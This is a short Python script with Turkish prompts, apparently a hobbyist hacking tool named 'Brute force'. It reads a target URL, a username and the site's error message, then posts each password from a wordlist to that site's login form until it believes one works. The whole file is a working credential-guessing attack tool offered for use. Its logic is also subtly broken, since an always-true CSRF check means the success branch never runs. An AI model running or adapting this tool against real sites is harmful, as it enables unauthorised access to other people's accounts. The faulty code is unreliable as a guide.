######################################################################################################
# Title: Brute force                                                                                 #
# Author: Enay-Project                                                                               #
######################################################################################################

print (""" 
██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                   Enay-Project
        
""")

z = """     
                       Server Test Ediliyor !!
        
        [+]█████████████████████████████████████████████████[+]
"""


import requests
import time
import sys

url = input("Hedef Url'yi giriniz: ")
username = input("Hedef Kullanici Adini Giriniz: ")
error = input("Yanlış Şifre Girilen Hata İletisi: ")

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try: 
    def bruteCracking(username,url,error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Deniyorum Sabret: "+ str(count) + ' Denemelerim => ' + password)
            data_dict = {"LogInID": username,"Sifre":password, "Giris yap":"Paylas"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF token var kardesim burdan is cikmaz. baska site dene")
                exit()
            else:
                print("Kullaniciadi: ---> " + username)
                print("Sifre: ---> " + password)
                exit()
except:
    print("İnternet yok dostum nere gidiyon? modemi res at gel !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username,url,error)

print("[!!] sifre burda yok, baska klasor dene bakayim onada")